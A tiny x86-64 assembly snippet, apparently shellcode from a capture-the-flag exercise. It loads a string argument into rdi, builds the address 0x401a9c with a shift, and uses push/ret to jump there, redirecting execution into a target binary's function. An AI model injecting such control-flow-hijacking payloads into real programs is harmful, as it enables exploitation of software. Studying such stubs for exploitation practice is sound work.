section .text
	global _start
 
_start:
	mov	rdi,"5ff762f9"
	mov	rax, 0x401a9caa
	shr	rax, 8
	push	rax
	ret